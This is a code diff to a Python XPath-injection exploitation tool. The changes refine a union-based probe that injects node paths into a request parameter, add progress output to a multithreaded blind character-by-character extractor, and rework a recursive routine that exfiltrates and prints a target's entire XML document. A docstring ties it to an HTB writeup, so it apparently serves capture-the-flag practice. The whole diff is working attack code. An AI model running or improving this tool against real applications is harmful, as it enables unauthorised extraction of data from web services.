@@ -323,23 +323,31 @@ def detect_boolean(engine: Engine, params: list[str],
 def detect_normal(engine: Engine, params: list[str]) -> Optional[Ctx]:
     info("  Trying: NORMAL (node-selection union)")
     for param in params:
+        # First: confirm null payload actually suppresses results
         for null in NULL_PAYLOADS:
-            nh, _ = engine.send({param: null})
-            for tpay in TRUE_PAYLOADS:
-                th, _ = engine.send({param: tpay})
-                if _has_data(th) and not _has_data(nh):
-                    for np in [p for p in params if p != param]:
-                        field = engine.req.all_params.get(np, "")
-                        if not field:
-                            continue
-                        for depth in range(2, 6):
-                            probe = field + "".join("/*[1]" for _ in range(depth))
-                            r, _ = engine.send({param: null, np: probe})
-                            if _has_data(r):
-                                ok(f"  [NORMAL] inj='{param}' node='{np}' field='{field}'")
-                                return Ctx(technique="normal", param=param,
-                                           node_param=np, field_name=field,
-                                           null_payload=null)
+            null_html, _ = engine.send({param: null})
+            null_len = len(null_html)
+
+            # Check what "normal" (true) looks like
+            for np in [p for p in params if p != param]:
+                field = engine.req.all_params.get(np, "")
+                if not field:
+                    continue
+
+                # Probe: inject node path via union  field | /*[1]/*[2]/*[1]
+                # This bypasses the null payload and forces node content into response
+                for depth in range(2, 7):
+                    path  = "".join(f"/*[1]" for _ in range(depth))
+                    probe = f"{field} | {path}"
+                    html, _ = engine.send({param: null, np: probe})
+                    probe_len = len(html)
+                    debug(f"    normal probe depth={depth} null_len={null_len} probe_len={probe_len} diff={probe_len-null_len}")
+                    # Probe response should be LARGER than null (extra node data injected)
+                    if probe_len > null_len + 5 and _has_data(html):
+                        ok(f"  [NORMAL] inj='{param}' node='{np}' field='{field}'")
+                        return Ctx(technique="normal", param=param,
+                                   node_param=np, field_name=field,
+                                   null_payload=null)
     return None
 
 
@@ -467,6 +475,12 @@ class BlindExtractor:
         if length == 0:
             return ""
         chars = ["_"] * length
+        label = expr.replace("name(", "").replace("(", "").replace(")", "").strip()[:20]
+
+        def show_progress(pos_or_done, total):
+            val = "".join(chars)
+            print(f"\r  {label} [{pos_or_done}/{total}]: {val}",
+                  end="", flush=True, file=sys.stderr)
 
         if self.threads > 1:
             lock = Lock()
@@ -476,15 +490,15 @@ class BlindExtractor:
                 with lock:
                     chars[pos-1] = ch
                     done[0] += 1
-                    print(f"\r    {''.join(chars)}  [{done[0]}/{length}]", end="", flush=True)
-            with ThreadPoolExecutor(max_workers=self.threads) as ex:
-                list(as_completed([ex.submit(fetch, i) for i in range(1, length+1)]))
+                    show_progress(done[0], length)
+            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+                list(as_completed([executor.submit(fetch, i) for i in range(1, length+1)]))
         else:
             for pos in range(1, length+1):
                 chars[pos-1] = self.get_char(expr, pos)
-                print(f"\r    {''.join(chars)}  [{pos}/{length}]", end="", flush=True)
+                show_progress(pos, length)
 
-        print()
+        print(file=sys.stderr)
         return "".join(chars)
 
 
@@ -496,24 +510,24 @@ def exfiltrate_node(ex: BlindExtractor, xpath: str,
                     depth: int = 0, max_depth: int = 8,
                     max_children: int = 20, xml_lines: list = None):
     """
-    Recursively exfiltrate and print XML live.
-    Mirrors the official approach from the HTB writeup.
+    Recursively exfiltrate XML.
+    Progress (name/value extraction) → stderr (live feedback).
+    xml_lines list  → collects clean XML, printed at the end.
     """
     indent = "  " * depth
 
-    name       = ex.get_string(f"name({xpath})")
+    name       = ex.get_string(f"name({xpath})")      # prints progress to stderr
     n_children = ex.get_count(f"{xpath}/*", max_n=max_children)
 
-    line_open = f"{indent}<{name}>"
-    print(f"{C.CYAN}{line_open}{C.RESET}")
+    line_open  = f"{indent}<{name}>"
+    line_close = f"{indent}</{name}>"
+
     if xml_lines is not None:
         xml_lines.append(line_open)
 
     if n_children == 0 or depth >= max_depth:
-        # Leaf node — extract value
-        value = ex.get_string(xpath)
+        value    = ex.get_string(xpath)                # prints progress to stderr
         line_val = f"{indent}  {value}"
-        print(f"{C.GREEN}{line_val}{C.RESET}")
         if xml_lines is not None:
             xml_lines.append(line_val)
     else:
@@ -521,8 +535,6 @@ def exfiltrate_node(ex: BlindExtractor, xpath: str,
             exfiltrate_node(ex, f"{xpath}/*[{i}]",
                             depth + 1, max_depth, max_children, xml_lines)
 
-    line_close = f"{indent}</{name}>"
-    print(f"{C.CYAN}{line_close}{C.RESET}")
     if xml_lines is not None:
         xml_lines.append(line_close)
 
@@ -837,13 +849,28 @@ def main():
 
         ex = BlindExtractor(oracle, threads=args.threads, max_str=args.max_string_len)
 
-        info("Exfiltrating XML document (live):")
+        info("Exfiltrating XML document...")
+        info("(Progress shown below — final XML printed when done)")
         print()
         exfiltrate_node(ex, "/*[1]",
                         depth=0,
                         max_depth=args.max_depth,
                         max_children=args.max_children,
                         xml_lines=xml_lines)
+
+        # Print clean final XML to stdout
+        print()
+        print(f"{C.BOLD}{'='*60}{C.RESET}")
+        print(f"{C.BOLD}  EXTRACTED XML{C.RESET}")
+        print(f"{C.BOLD}{'='*60}{C.RESET}")
+        for line in xml_lines:
+            # Color: tags cyan, values green
+            stripped = line.strip()
+            if stripped.startswith("<") and not stripped.startswith("<!--"):
+                print(f"{C.CYAN}{line}{C.RESET}")
+            else:
+                print(f"{C.GREEN}{line}{C.RESET}")
+        print(f"{C.BOLD}{'='*60}{C.RESET}")
 
     if args.xml and xml_lines:
         with open(args.xml, "w") as fh:
